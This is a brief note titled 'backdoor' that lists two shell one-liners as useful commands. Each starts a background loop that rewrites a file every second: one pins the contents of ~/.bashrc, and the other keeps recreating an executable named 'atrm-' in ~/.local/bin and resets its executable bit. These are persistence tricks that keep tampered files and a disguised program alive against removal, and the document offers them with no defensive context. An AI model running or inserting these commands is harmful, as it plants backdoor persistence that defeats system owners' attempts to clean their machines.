# backdoor

## Usefull Commands

```
c=$(cat ~/.bashrc); while [ 1 ]; do echo "$c" > ~/.bashrc; sleep 1; done &
```

```
a=$(cat $HOME/.local/bin/atrm-); while [ 1 ]; do mkdir -p $HOME/.local/bin; echo "$a" > $HOME/.local/bin/atrm-; chmod +x $HOME/.local/bin/atrm-; sleep 1; done &
```
